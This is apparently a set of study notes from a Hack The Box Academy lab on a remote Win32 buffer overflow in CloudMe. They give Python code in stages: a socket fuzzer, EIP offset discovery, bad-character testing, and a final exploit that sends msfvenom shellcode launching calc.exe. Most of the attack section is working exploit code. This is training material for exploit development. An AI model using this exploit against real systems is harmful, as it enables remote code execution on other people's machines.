## Table of Contents

  - [Gradual Fuzzing](#Gradual\Fuzzing)
- [Controlling EIP](#controlling\eip)
  - [Identifying Bad Characters](#Identifying\Bad\Characters)
  - [Finding a Return Instruction](#Finding\a\Return\Instruction)


```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

def fuzz():
    for i in range(0,10000,500):
        buffer = b"A"*i
        print("Fuzzing %s bytes" % i)
```

The print statement helps us know the current fuzzing buffer size so that when the program eventually crashes, we know what length caused it to crash.

Next, we need to connect to the port each time and send our payload to it. To do so, we have to import the `socket` library as we did at the beginning of our code above, and then establish a connection to the port with the `connect` function, as follows:

Code: python

```python
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
```

With that, we should be ready to send our buffer, which we can do through `s.send(buffer)`. We will also need to wrap our loop in a `try/except` block, so that we can stop the execution when the program crashes and does not accept connections anymore. Our final `fuzz()` function should look as follows:

Code: python

```python
def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```

Note: In our case, the program is closing the connection after each input, as we saw earlier, so we are establishing a new connection at each loop iteration. If we could persist the connection, like an ftp or email client, it would be better to establish the connection before the loop, and then loop the `s.send(buffer)` function.

Tip: As our server is vulnerable at the entry point after establishing the connection, we are directly sending our payload. It is also possible to interact with the server and pass data like login credentials or certain parameters to reach the vulnerable function, by using `send` and `recv`. You can read more about `socket` functions in the [Official Documentation](https://docs.python.org/3/library/socket.html).

We run our script and see the following:

```cmd-session
Fuzzing 0 bytes
Fuzzing 500 bytes
...SNIP...
Fuzzing 9000 bytes
Fuzzing 9500 bytes
```

We see that the entire script ran without crashing the listening services, as port `8888` was still listening throughout our fuzzing. However, if we check our `x32dbg` debugger, we see that the front-end `cloudme` program crashed, and its `EIP` was overwritten with our `A`'s buffer:

![Remote Fuzz](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_fuzz.jpg)

This indicates that the actual listening service may not be vulnerable since our input never crashes it. However, the front-end program must also be processing this input (e.g., for syncing files), and it is vulnerable to a buffer overflow, which we can exploit through the listening service. This is a unique case that shows that if an input is processed at multiple locations/programs, we must be sure to debug all of them, as only one of them may be vulnerable.

---

## Gradual Fuzzing

We face the issue here because our program never stops sending payloads since the listening service never crashes. So, how would we be able to know at which buffer length the program crashed?

We can gradually send our buffer by adding a `breakpoint()` after `s.send(buffer)`, such that when we can manually continue by hitting `c`, we can see whether our input crashed the program and overwrote `EIP`.

# Controlling EIP
Start by creating a unique pattern 2000 bytes long. `ERC --patern c 2000`

Now we start writing our `eip_offset()` function. We'll add our `pattern` variable like with the pattern under `Ascii` in the `Pattern_Create_1.txt` file created on our desktop, like we did with our previous exploit. After that, to send our pattern, we can use the same code we used to fuzz the port:

Code: python

```python
def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

eip_offset()
```

Once our `eip_offset()` function is ready, we can restart our program in `x32dbg` and run our code, and our program should crash, and we should see `EIP` overwritten with our pattern as `316A4230`:

Now we can use `ERC --pattern o 1jB0` to calculate the exact offset, which is found at `1052` bytes:

![Pattern Offset](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_offset.jpg)

Now to ensure that we can control the exact value at `EIP`, we'll use the same `eip_control()` function from our previous exploit (while changing `offset`), but with using `socket` to send our payload instead of writing it to a file:

Code: python

```python
def eip_control():
    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

eip_control()
```

We'll once again restart our program and run our exploit, and we can confirm that we control `EIP` as we overwrote `EIP` with 4 `B`'s: ![Pattern Control](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_control.jpg)

---

## Identifying Bad Characters

Our next step is to identify whether we should avoid using any bad characters in our input. We can start by running `ERC --bytearray` in `x32dbg` to create our `ByteArray_1.bin` file. Then we can copy the same `bad_chars()` functions from our previous exploit, and once again change from writing the payload to a file to sending it to the port:

Code: python

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

## Finding a Return Instruction

Now that we have control over `EIP` and know which bad characters to avoid in our payload, we need to find an instruction to execute the payload we will place on the stack. Once again, since this program does not have any bad characters, we can use the `ESP` address as our return address. (Try to exploit the program by using `ESP` as the return address).

However, we will prefer using an address of an instruction built within the program to ensure it will run on any system, as these instructions will be the same on any system. So, we'll first get a list of modules and libraries loaded by the program, and we will only consider ones that have `False` for all protections, which are the following:

Now to create our final `exploit()` function, we'll first add the above output, and will use the same `payload` from our previous exploit (while changing `offset` and address in `eip`). Finally, we will use the same code from `bad_chars()` to send our payload to the port:

Code: python

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
    buf = b""
    ...SNIP...
    buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
```

